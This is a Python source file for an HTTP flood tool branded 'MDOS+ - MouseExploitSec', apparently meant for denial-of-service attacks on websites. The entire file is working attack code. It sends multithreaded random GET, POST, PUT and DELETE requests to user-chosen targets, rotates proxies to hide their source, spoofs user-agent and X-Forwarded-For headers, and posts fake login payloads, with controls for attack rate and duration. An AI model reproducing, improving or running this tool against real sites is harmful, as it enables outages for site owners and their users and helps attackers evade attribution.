import requests
import random
import time
import logging
import sys
import os
import argparse
import json
import csv
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

init(autoreset=True)

logging.basicConfig(
    filename="http_flood.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)...",
]

RANDOM_PATHS = ["/", "/about", "/contact", "/products", "/services", "/login", "/search", "/checkout"]

success_count = 0
fail_count = 0
request_count = 0
bad_proxies = set()
proxy_list = []
start_time = time.time()
custom_headers = {}

def load_proxies(proxy_type):
    global proxy_list
    try:
        with open("proxies.txt", "r") as f:
            proxy_list = [line.strip() for line in f if line.strip().startswith(proxy_type)]
        print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies.")
    except FileNotFoundError:
        print(Fore.RED + "[-] proxies.txt tidak ditemukan.")
        sys.exit(1)

def load_custom_headers():
    global custom_headers
    if os.path.exists("custom_headers.txt"):
        with open("custom_headers.txt", "r") as f:
            for line in f:
                if ":" in line:
                    key, value = line.split(":", 1)
                    custom_headers[key.strip()] = value.strip()
        print(Fore.GREEN + "[+] Custom headers loaded.")

def generate_random_payload():
    return {
        "username": f"user{random.randint(1000, 9999)}",
        "password": f"pass{random.randint(1000, 9999)}",
        "email": f"user{random.randint(1000,9999)}@example.com",
        "timestamp": int(time.time())
    }

def generate_random_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/",
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
    }
    headers.update(custom_headers)
    return headers

def format_url(url):
    if not url.startswith("http"):
        url = "https://" + url
    return url.rstrip("/")

def get_random_proxy():
    if not proxy_list:
        return None
    while True:
        proxy = random.choice(proxy_list)
        if proxy not in bad_proxies:
            return {"http": proxy, "https": proxy}

def send_request(target_url, retries=3, use_proxy=False, verify_ssl=True, dry_run=False, timeout=10, quiet=False):
    global success_count, fail_count, request_count
    try:
        headers = generate_random_headers()
        path = random.choice(RANDOM_PATHS)
        url = target_url + path
        query = f"?id={random.randint(1, 100000)}&ref={random.randint(1, 1000)}"
        url += query
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        proxy = get_random_proxy() if use_proxy else None

        if dry_run:
            print(Fore.YELLOW + f"[DryRun] {method} {url} | Headers: {headers}")
            return

        with requests.Session() as session:
            for attempt in range(retries):
                try:
                    response = {
                        "GET": session.get,
                        "POST": lambda: session.post(url, headers=headers, json=generate_random_payload()),
                        "PUT": lambda: session.put(url, headers=headers, json=generate_random_payload()),
                        "DELETE": session.delete
                    }.get(method, session.get)(url, headers=headers, timeout=timeout, verify=verify_ssl, proxies=proxy)

                    request_count += 1
                    if response.status_code == 200:
                        success_count += 1
                        if not quiet:
                            print(Fore.GREEN + f"[+] {method} {url} => 200 OK")
                    else:
                        fail_count += 1
                        if not quiet:
                            print(Fore.RED + f"[!] {method} {url} => {response.status_code}")
                    break
                except requests.exceptions.RequestException as e:
                    if use_proxy and proxy:
                        bad_proxies.add(proxy["http"])
                    if attempt == retries - 1:
                        fail_count += 1
                        if not quiet:
                            print(Fore.RED + f"[-] Failed: {url} | {e}")
                    else:
                        time.sleep(0.5)
    except Exception as e:
        fail_count += 1
        if not quiet:
            print(Fore.RED + f"[!] Unexpected error: {e}")

def export_results():
    with open("results.json", "w") as f_json, open("results.csv", "w", newline="") as f_csv:
        data = {"success": success_count, "fail": fail_count, "total": request_count}
        json.dump(data, f_json)

        writer = csv.writer(f_csv)
        writer.writerow(["Success", "Fail", "Total"])
        writer.writerow([success_count, fail_count, request_count])

def http_flood(target_urls, threads, rate, use_proxy=False, verify_ssl=True, max_requests=None, duration=None, dry_run=False, timeout=10, quiet=False):
    global start_time
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        try:
            while True:
                for target_url in target_urls:
                    if max_requests and request_count >= max_requests:
                        raise KeyboardInterrupt
                    if duration and (time.time() - start_time) > duration:
                        raise KeyboardInterrupt

                    for _ in range(threads // len(target_urls)):
                        executor.submit(send_request, target_url, use_proxy=use_proxy, verify_ssl=verify_ssl,
                                        dry_run=dry_run, timeout=timeout, quiet=quiet)

                if not quiet:
                    elapsed = time.time() - start_time
                    rps = request_count / elapsed if elapsed > 0 else 0
                    print(Fore.CYAN + f"[+] Total: {request_count} | OK: {success_count} | Fail: {fail_count} | RPS: {rps:.2f}")
                time.sleep(1 / rate)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Stopped by user.")
            export_results()

if __name__ == "__main__":
    print(Fore.CYAN + r"""
   *    (        )  (     
 (  `   )\ )  ( /(  )\ )  
 )\))( (()/(  )\())(()/(  
((_)()\ /(_))((_)\/(_)) 
(_()((_|_))_   ((_)(_))   
|  \/  ||   \ / _ \/ __|  
| |\/| || |) | (_) \__ \  
|_|  |_||___/ \___/|___/  
>> MDOS+ - MouseExploitSec 
""")

    parser = argparse.ArgumentParser(description="Advanced HTTP Flood Tool with Proxy and Header Support")
    parser.add_argument("target_urls", nargs="+", help="Target URL(s)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-r", "--rate", type=int, default=10, help="Request rate per second")
    parser.add_argument("--proxy", action="store_true", help="Enable proxy support")
    parser.add_argument("--proxy-type", type=str, default="http", choices=["http", "socks5"], help="Proxy type")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--retries", type=int, default=3, help="Retry attempts")
    parser.add_argument("--dry-run", action="store_true", help="Simulate requests without sending")
    parser.add_argument("--max-requests", type=int, help="Max number of requests before stopping")
    parser.add_argument("--duration", type=int, help="Duration of attack in seconds")
    parser.add_argument("--quiet", action="store_true", help="Silent mode (minimal output)")

    args = parser.parse_args()

    if args.proxy:
        load_proxies(args.proxy_type)

    load_custom_headers()

    urls = [format_url(url) for url in args.target_urls]
    http_flood(
        urls,
        threads=args.threads,
        rate=args.rate,
        use_proxy=args.proxy,
        verify_ssl=not args.no_ssl,
        max_requests=args.max_requests,
        duration=args.duration,
        dry_run=args.dry_run,
        timeout=args.timeout,
        quiet=args.quiet
    )
